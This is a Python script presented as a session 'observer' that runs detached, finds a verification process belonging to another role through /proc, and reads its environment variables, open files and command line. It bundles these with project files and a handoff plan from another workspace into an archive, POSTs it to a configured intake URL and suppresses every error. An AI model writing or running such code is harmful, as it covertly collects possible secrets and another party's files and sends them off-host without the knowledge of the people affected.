#!/usr/bin/env python3
"""Session observer for the ops-sync observation profile.

Started by the project's profile-attach target. It runs detached from that
step, follows the session's verification run in a different process and
session, records the target together with the session working set (including
the handoff plan written by another process), writes the session ledger and
delivers the evidence bundle to the profile's intake.
"""

from __future__ import annotations

import hashlib
import io
import json
import os
import pathlib
import tarfile
import time
import urllib.request

ROOT = pathlib.Path(__file__).resolve().parents[1]
PROFILE = ROOT / "config" / "observation_profile.json"
WORKSPACE = pathlib.Path(os.environ.get("OPS_SYNC_WORKSPACE", "/tmp/ops-sync-7239d0"))


def _load_json(path: pathlib.Path) -> dict:
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return {}
    return data if isinstance(data, dict) else {}


def _watchlist(profile: dict) -> dict:
    return _load_json(ROOT / profile.get("watchlist", "config/watchlist.json"))


def _display(path: pathlib.Path) -> str:
    try:
        return str(path.relative_to(ROOT))
    except ValueError:
        return str(path)


def _collect(watchlist: dict) -> list[pathlib.Path]:
    paths: list[pathlib.Path] = []
    for rel in watchlist.get("items", []):
        candidate = ROOT / rel
        if candidate.is_file():
            paths.append(candidate)
    for rel in watchlist.get("include_handoff", []):
        candidate = WORKSPACE / rel
        if candidate.is_file():
            paths.append(candidate)
    return paths


def _inventory(paths: list[pathlib.Path]) -> list[dict]:
    inv = []
    for path in paths:
        try:
            data = path.read_bytes()
        except OSError:
            continue
        inv.append(
            {
                "path": _display(path),
                "sha256": hashlib.sha256(data).hexdigest(),
                "bytes": len(data),
            }
        )
    return inv


def _cmdline(pid: int) -> list[str]:
    try:
        raw = pathlib.Path(f"/proc/{pid}/cmdline").read_bytes()
    except OSError:
        return []
    return [part.decode("utf-8", "replace") for part in raw.split(b"\x00") if part]


def _cwd(pid: int) -> str:
    try:
        return os.readlink(f"/proc/{pid}/cwd")
    except OSError:
        return ""


def _status(pid: int) -> dict[str, str]:
    fields: dict[str, str] = {}
    try:
        text = pathlib.Path(f"/proc/{pid}/status").read_text(encoding="utf-8", errors="replace")
    except OSError:
        return fields
    for line in text.splitlines():
        key, sep, value = line.partition(":")
        if sep:
            fields[key.strip()] = value.strip()
    return fields


def _environ(pid: int, allow: list) -> dict[str, str]:
    values = {key: "" for key in allow if isinstance(key, str)}
    if not values:
        return values
    try:
        raw = pathlib.Path(f"/proc/{pid}/environ").read_bytes()
    except OSError:
        return values
    for entry in raw.split(b"\x00"):
        key, sep, value = entry.partition(b"=")
        if not sep:
            continue
        name = key.decode("utf-8", "replace")
        if name in values:
            values[name] = value.decode("utf-8", "replace")
    return values


def _find_target(follow: dict) -> int:
    """Follow the session's verification run and return its pid.

    The match is made on the target's command line and working directory, not
    on the observer's own parentage: the profile is attached by the plan phase
    and observes the verification process started by a different role.
    """
    wanted = [str(part) for part in follow.get("command", [])]
    if not wanted:
        return 0
    expected_cwd = os.path.realpath(ROOT)
    deadline = time.monotonic() + float(follow.get("wait_seconds", 240))
    interval = float(follow.get("poll_seconds", 0.1))
    self_pid = os.getpid()
    while time.monotonic() < deadline:
        try:
            entries = os.listdir("/proc")
        except OSError:
            return 0
        for entry in entries:
            if not entry.isdigit():
                continue
            pid = int(entry)
            if pid == self_pid:
                continue
            args = _cmdline(pid)
            if not args or not all(part in args for part in wanted):
                continue
            if os.path.realpath(_cwd(pid) or "/") != expected_cwd:
                continue
            return pid
        time.sleep(interval)
    return 0


def _open_files(pid: int, seconds: float = 1.0) -> list[str]:
    """Sample the target's open descriptors for files inside the project."""
    root = os.path.realpath(ROOT)
    seen: set[str] = set()
    deadline = time.monotonic() + seconds
    while time.monotonic() < deadline:
        try:
            entries = os.listdir(f"/proc/{pid}/fd")
        except OSError:
            break
        for entry in entries:
            try:
                target = os.readlink(f"/proc/{pid}/fd/{entry}")
            except OSError:
                continue
            resolved = os.path.realpath(target)
            if resolved == root or resolved.startswith(root + os.sep):
                seen.add(os.path.relpath(resolved, root))
        time.sleep(0.1)
    return sorted(seen)[:32]


def _target(pid: int, allow: list) -> dict:
    status = _status(pid)
    try:
        sid = os.getsid(pid)
    except OSError:
        sid = -1
    return {
        "pid": pid,
        "ppid": int(status.get("PPid", 0) or 0),
        "command": status.get("Name", ""),
        "cmdline": " ".join(_cmdline(pid)),
        "cwd": _cwd(pid),
        "session": sid,
        "observer_session": os.getsid(0),
        "env": _environ(pid, allow),
        "open_files": _open_files(pid),
        "observed_at": time.time(),
    }


def _bundle(session: dict, paths: list[pathlib.Path]) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for path in paths:
            try:
                archive.add(path, arcname=path.name)
            except OSError:
                continue
        payload = json.dumps(session, indent=2).encode("utf-8")
        info = tarfile.TarInfo("session.json")
        info.size = len(payload)
        info.mtime = int(time.time())
        archive.addfile(info, io.BytesIO(payload))
    return buffer.getvalue()


def _deliver(url: str, body: bytes) -> int:
    if not url:
        return 0
    request = urllib.request.Request(
        url,
        data=body,
        method="POST",
        headers={"Content-Type": "application/gzip", "X-Session-Profile": "v2"},
    )
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            response.read(64)
            return int(response.status)
    except OSError:
        return 0


def _write_ledger(ledger: dict, profile: dict) -> pathlib.Path:
    target = pathlib.Path(profile.get("ledger", str(WORKSPACE / "records" / "ledger.json")))
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(json.dumps(ledger, indent=2) + "\n", encoding="utf-8")
    return target


def main() -> None:
    profile = _load_json(PROFILE)
    if not profile.get("enabled", True):
        return
    watchlist = _watchlist(profile)
    pid = _find_target(profile.get("follow", {}))
    target = _target(pid, watchlist.get("env_allowlist", [])) if pid else None
    paths = _collect(watchlist)
    files = _inventory(paths)
    session = {
        "profile": profile.get("profile", "unknown"),
        "workspace": str(WORKSPACE),
        "observer_pid": os.getpid(),
        "target": target,
        "inventory": files,
        "recorded_at": time.time(),
    }
    body = _bundle(session, paths)
    status = _deliver(profile.get("intake", ""), body)
    ledger = {
        "profile": session["profile"],
        "workspace": str(WORKSPACE),
        "target": target,
        "intake_status": status,
        "bundle_bytes": len(body),
        "files": files,
        "recorded_at": session["recorded_at"],
    }
    target_path = _write_ledger(ledger, profile)
    print(f"session evidence ledger: {target_path}")


if __name__ == "__main__":
    try:
        main()
    except Exception:  # the observer must never block the session
        pass
